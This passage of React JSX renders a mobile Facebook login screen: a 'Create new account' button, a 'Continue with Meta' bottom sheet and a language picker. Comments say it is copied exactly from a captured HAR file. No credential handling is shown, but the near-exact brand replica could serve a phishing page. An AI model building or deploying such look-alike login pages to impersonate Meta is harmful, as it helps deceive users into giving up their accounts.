                                                                  border: '1px solid rgb(0, 100, 224)',
                                                                  borderRadius: '22px',
                                                                  alignItems: 'center',
                                                                  flexDirection: 'row',
                                                                  justifyContent: 'center',
                                                                  paddingLeft: '20px',
                                                                  paddingRight: '20px'
                                                                }}
                                                              >
                                                                <div className="wbloks_1" style={{ pointerEvents: 'none', opacity: 1, alignItems: 'center', flexDirection: 'row', justifyContent: 'center' }}>
                                                                  <div dir="auto" className="wbloks_1" style={{ lineHeight: 1.30013, display: 'block', textAlign: 'start', overflow: 'hidden' }}>
                                                                    <div style={{ fontSize: '15.2px', paddingTop: '1.19901px', paddingBottom: '1.19901px', transform: 'translateY(calc(6.5e-05em))' }}>
                                                                      <div className="wbloks_125" style={{ fontSize: '15.2px', maxHeight: '19.762px', wordBreak: 'break-all' }}>
                                                                        <div className="wbloks_126" dir="auto">
                                                                          <span
                                                                            style={{
                                                                              color: 'rgb(0, 100, 224)',
                                                                              fontWeight: 500,
                                                                              display: 'inline',
                                                                              fontSize: '15.2px',
                                                                              fontFamily: '"Optimistic 95"',
                                                                              fontVariationSettings: 'normal',
                                                                              whiteSpace: 'pre-wrap',
                                                                              overflowWrap: 'break-word'
                                                                            }}
                                                                          >
                                                                            Create new account
                                                                          </span>
                                                                        </div>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>

                                                      {/* Meta Infinity Logo */}
                                                      <div
                                                        className="wbloks_1"
                                                        style={{
                                                          pointerEvents: 'none',
                                                          alignItems: 'center',
                                                          justifyContent: 'center',
                                                          paddingTop: '20px',
                                                          paddingBottom: '20px'
                                                        }}
                                                      >
                                                        <div
                                                          className="wbloks_1"
                                                          style={{ height: '12px', aspectRatio: '5 / 1', cursor: 'pointer', pointerEvents: 'auto' }}
                                                          onClick={openMetaBottomSheet}
                                                          title="Continue with Meta Account"
                                                        >
                                                          <div className="wbloks_120" style={{ aspectRatio: '5 / 1' }}>
                                                            <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5" className="wbloks_122"></svg>
                                                          </div>
                                                          <div className="wbloks_121">
                                                            <img
                                                              alt="Meta logo"
                                                              className="wbloks_1"
                                                              src="/rsrc.php/ys/r/RkrEdst9VSp.webp"
                                                              style={{
                                                                height: '100%',
                                                                width: '100%',
                                                                pointerEvents: 'inherit',
                                                                objectFit: 'contain',
                                                                overflow: 'hidden'
                                                              }}
                                                            />
                                                          </div>
                                                        </div>
                                                      </div>

                                                      {/* Footer Links: About • Help • More */}
                                                      <div
                                                        className="wbloks_1"
                                                        style={{
                                                          pointerEvents: 'none',
                                                          alignItems: 'center',
                                                          flexDirection: 'column',
                                                          justifyContent: 'center'
                                                        }}
                                                      >
                                                        <div className="wbloks_1" style={{ pointerEvents: 'none' }}>
                                                          <div className="wbloks_1" style={{ pointerEvents: 'none', paddingBottom: '4px', paddingLeft: '4px', paddingRight: '4px' }}>
                                                            <span
                                                              role="link"
                                                              tabIndex={0}
                                                              style={{
                                                                pointerEvents: 'auto',
                                                                cursor: 'pointer',
                                                                WebkitTapHighlightColor: 'transparent',
                                                                color: 'rgb(99, 120, 138)',
                                                                display: 'inline',
                                                                fontSize: '10px',
                                                                whiteSpace: 'pre-wrap',
                                                                overflowWrap: 'break-word'
                                                              }}
                                                              onClick={(e) => e.preventDefault()}
                                                            >
                                                              About
                                                            </span>
                                                          </div>
                                                          <div className="wbloks_1" style={{ pointerEvents: 'none', paddingBottom: '4px', paddingLeft: '4px', paddingRight: '4px' }}>
                                                            <span
                                                              role="link"
                                                              tabIndex={0}
                                                              style={{
                                                                pointerEvents: 'auto',
                                                                cursor: 'pointer',
                                                                WebkitTapHighlightColor: 'transparent',
                                                                color: 'rgb(99, 120, 138)',
                                                                display: 'inline',
                                                                fontSize: '10px',
                                                                whiteSpace: 'pre-wrap',
                                                                overflowWrap: 'break-word'
                                                              }}
                                                              onClick={(e) => e.preventDefault()}
                                                            >
                                                              Help
                                                            </span>
                                                          </div>
                                                          <div className="wbloks_1" style={{ pointerEvents: 'none', paddingBottom: '4px', paddingLeft: '4px', paddingRight: '4px' }}>
                                                            <span
                                                              role="link"
                                                              tabIndex={0}
                                                              style={{
                                                                pointerEvents: 'auto',
                                                                cursor: 'pointer',
                                                                WebkitTapHighlightColor: 'transparent',
                                                                color: 'rgb(99, 120, 138)',
                                                                display: 'inline',
                                                                fontSize: '10px',
                                                                whiteSpace: 'pre-wrap',
                                                                overflowWrap: 'break-word'
                                                              }}
                                                              onClick={openMetaBottomSheet}
                                                            >
                                                              More
                                                            </span>
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* ========================================================================= */}
                    {/* META FAMILY OF APPS (FOA) "CONTINUE WITH META" HALF-SCREEN BOTTOM SHEET */}
                    {/* ========================================================================= */}
                    {showMetaBottomSheet && (
                      <div
                        aria-modal="true"
                        role="dialog"
                        tabIndex={-1}
                        style={{
                          position: 'fixed',
                          inset: 0,
                          backgroundColor: metaSheetVisible ? 'rgba(28, 43, 51, 0.72)' : 'rgba(28, 43, 51, 0)',
                          zIndex: 9999,
                          display: 'flex',
                          flexDirection: 'column',
                          justifyContent: 'flex-end',
                          transition: 'background-color 0.28s cubic-bezier(0.17, 0.17, 0, 1)',
                          WebkitTapHighlightColor: 'transparent'
                        }}
                        onClick={closeMetaBottomSheet}
                      >
                        <div
                          className="wbloks_129 wbloks_131"
                          role="presentation"
                          style={{
                            backgroundColor: '#FFFFFF',
                            borderRadius: '16px 16px 0 0',
                            padding: '12px 20px 24px',
                            minHeight: 'auto',
                            maxHeight: '85vh',
                            width: '100%',
                            maxWidth: '480px',
                            margin: '0 auto',
                            boxSizing: 'border-box',
                            boxShadow: '0 -4px 24px rgba(0, 0, 0, 0.18)',
                            transform: metaSheetVisible ? 'translateY(0)' : 'translateY(100%)',
                            transition: 'transform 0.28s cubic-bezier(0.17, 0.17, 0, 1)',
                            cursor: 'default',
                            display: 'flex',
                            flexDirection: 'column',
                            position: 'relative'
                          }}
                          onClick={(e) => e.stopPropagation()}
                        >
                          {/* Close Handle Bar */}
                          <div className="wbloks_133" style={{ width: '100%', display: 'flex', justifyContent: 'center' }}>
                            <div className="wbloks_134" style={{ cursor: 'pointer' }} onClick={closeMetaBottomSheet}></div>
                          </div>

                          {/* Close 'X' Button on top right */}
                          <div
                            tabIndex={0}
                            role="button"
                            aria-label="Close"
                            onClick={closeMetaBottomSheet}
                            style={{
                              position: 'absolute',
                              top: '12px',
                              right: '16px',
                              width: '32px',
                              height: '32px',
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'center',
                              cursor: 'pointer',
                              borderRadius: '50%'
                            }}
                          >
                            <img
                              alt="Close"
                              src="/rsrc.php/y8/r/XpWPmzCEVDS.webp"
                              style={{
                                width: '20px',
                                height: '20px',
                                maskImage: 'url("/rsrc.php/y8/r/XpWPmzCEVDS.webp")',
                                WebkitMaskImage: 'url("/rsrc.php/y8/r/XpWPmzCEVDS.webp")',
                                maskSize: 'cover',
                                WebkitMaskSize: 'cover',
                                backgroundColor: 'rgb(104, 106, 110)',
                                objectFit: 'cover'
                              }}
                            />
                          </div>

                          {/* Meta Constellation Hero Illustration (100% exact from HAR entry 41) */}
                          <div
                            style={{
                              width: '100%',
                              display: 'flex',
                              justifyContent: 'center',
                              alignItems: 'center',
                              paddingTop: '16px',
                              paddingBottom: '16px'
                            }}
                          >
                            <div
                              style={{
                                position: 'relative',
                                width: '343px',
                                height: '116.5px',
                                margin: '0 auto'
                              }}
                            >
                              {/* Center Large Meta Infinity Logo */}
                              <img
                                alt="Meta"
                                src="/rsrc.php/y-/r/d73UG10vgxw.webp"
                                style={{
                                  position: 'absolute',
                                  left: '115px',
                                  top: '22px',
                                  width: '110px',
                                  height: '72px',
                                  objectFit: 'contain'
                                }}
                              />

                              {/* Facebook Badge (top-left) */}
                              <img
                                alt="Facebook"
                                src="/rsrc.php/yt/r/m-eF6r5Wlln.webp"
                                style={{
                                  position: 'absolute',
                                  left: '18px',
                                  top: '10px',
                                  width: '54px',
                                  height: '54px',
                                  transform: 'rotate(17deg)',
                                  objectFit: 'contain',
                                  filter: 'drop-shadow(0 3px 6px rgba(0,0,0,0.12))'
                                }}
                              />

                              {/* Messenger Badge (top-right) */}
                              <img
                                alt="Messenger"
                                src="/rsrc.php/yJ/r/5yjMTAfnv98.webp"
                                style={{
                                  position: 'absolute',
                                  left: '246.5px',
                                  top: '-6.5px',
                                  width: '42px',
                                  height: '42px',
                                  transform: 'rotate(-5.4deg)',
                                  objectFit: 'contain',
                                  filter: 'drop-shadow(0 3px 6px rgba(0,0,0,0.12))'
                                }}
                              />

                              {/* Instagram Badge (bottom-right) */}
                              <img
                                alt="Instagram"
                                src="/rsrc.php/yt/r/aU5Ji88A7zq.webp"
                                style={{
                                  position: 'absolute',
                                  left: '260px',
                                  top: '55.5px',
                                  width: '52px',
                                  height: '52px',
                                  transform: 'rotate(7deg)',
                                  objectFit: 'contain',
                                  filter: 'drop-shadow(0 3px 6px rgba(0,0,0,0.12))'
                                }}
                              />

                              {/* Threads Badge (bottom-left) */}
                              <div
                                style={{
                                  position: 'absolute',
                                  left: '53px',
                                  top: '71px',
                                  width: '48px',
                                  height: '48px',
                                  transform: 'rotate(-6.6deg)',
                                  backgroundColor: '#FFFFFF',
                                  borderRadius: '50%',
                                  display: 'flex',
                                  alignItems: 'center',
                                  justifyContent: 'center',
                                  boxShadow: '0 3px 6px rgba(0,0,0,0.12)'
                                }}
                              >
                                <img
                                  alt="Threads"
                                  src="/rsrc.php/yr/r/wMyrLGPYKPq.webp"
                                  style={{
                                    width: '32px',
                                    height: '32px',
                                    objectFit: 'contain'
                                  }}
                                />
                              </div>
                            </div>
                          </div>

                          {/* Header Text */}
                          <div style={{ marginTop: '4px', marginBottom: '8px' }}>
                            <div
                              style={{
                                fontSize: '24px',
                                fontWeight: 600,
                                lineHeight: 1.25,
                                fontFamily: '"Optimistic VF App Lite", "Optimistic 95", system-ui, -apple-system, sans-serif',
                                color: '#111112',
                                textAlign: 'left'
                              }}
                            >
                              Already logged in on another Meta app?
                            </div>
                          </div>

                          {/* Body Subtext */}
                          <div style={{ marginBottom: '24px' }}>
                            <div
                              style={{
                                fontSize: '15.6px',
                                fontWeight: 400,
                                lineHeight: 1.35,
                                fontFamily: '"Optimistic VF App Lite", "Optimistic 95", system-ui, -apple-system, sans-serif',
                                color: '#323435',
                                textAlign: 'left'
                              }}
                            >
                              If you're logged in to Instagram, Messenger or Threads, you can use your Meta Account to continue to Facebook faster.
                            </div>
                          </div>

                          {/* Action Buttons */}
                          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                            {/* Continue Button */}
                            <button
                              type="button"
                              onClick={handleMetaContinue}
                              style={{
                                width: '100%',
                                height: '44px',
                                borderRadius: '22px',
                                backgroundColor: 'rgb(0, 100, 224)',
                                color: '#FFFFFF',
                                fontSize: '15.2px',
                                fontWeight: 500,
                                fontFamily: '"Optimistic 95", system-ui, sans-serif',
                                border: 'none',
                                cursor: 'pointer',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                                outline: 'none'
                              }}
                            >
                              {isMetaContinuing ? 'Connecting with Meta...' : 'Continue'}
                            </button>

                            {/* Cancel Button */}
                            <button
                              type="button"
                              onClick={closeMetaBottomSheet}
                              style={{
                                width: '100%',
                                height: '44px',
                                borderRadius: '22px',
                                backgroundColor: 'transparent',
                                color: '#28292B',
                                fontSize: '15.2px',
                                fontWeight: 500,
                                fontFamily: '"Optimistic 95", system-ui, sans-serif',
                                border: 'none',
                                cursor: 'pointer',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                                outline: 'none'
                              }}
                            >
                              Cancel
                            </button>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Language Selector Modal */}
                    {showLanguageModal && (
                      <div
                        style={{
                          position: 'fixed',
                          inset: 0,
                          backgroundColor: 'rgba(0, 0, 0, 0.65)',
                          zIndex: 9999,
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          padding: '20px'
                        }}
                        onClick={() => setShowLanguageModal(false)}
                      >
                        <div
                          style={{
                            backgroundColor: '#ffffff',
                            borderRadius: '12px',
                            width: '100%',
                            maxWidth: '360px',
                            overflow: 'hidden',
                            boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
                          }}
                          onClick={(e) => e.stopPropagation()}
                        >
                          <div style={{ padding: '16px', borderBottom: '1px solid rgb(224, 226, 228)', fontWeight: 600, fontSize: '16px' }}>
                            Select your language
                          </div>
                          <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
                            {languages.map((lang) => (
                              <div
                                key={lang}
                                onClick={() => {
                                  setCurrentLanguage(lang);
                                  setShowLanguageModal(false);
                                }}
                                style={{
                                  padding: '12px 16px',
                                  fontSize: '14.5px',
                                  cursor: 'pointer',
                                  backgroundColor: currentLanguage === lang ? 'rgb(240, 242, 245)' : 'transparent',
                                  color: currentLanguage === lang ? 'rgb(0, 100, 224)' : 'rgb(17, 17, 18)',
                                  fontWeight: currentLanguage === lang ? 600 : 400,
                                  borderBottom: '0.5px solid rgb(240, 242, 245)'
                                }}
                              >
                                {lang}
                              </div>
                            ))}
                          </div>
                          <div style={{ padding: '10px 16px', textAlign: 'right' }}>
                            <button
                              type="button"
                              onClick={() => setShowLanguageModal(false)}
                              style={{
                                background: 'transparent',
                                border: 'none',
                                color: 'rgb(0, 100, 224)',
                                fontWeight: 600,
                                fontSize: '14px',
                                cursor: 'pointer'
                              }}
                            >
                              Cancel
                            </button>
                          </div>
                        </div>
                      </div>
                    )}

                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
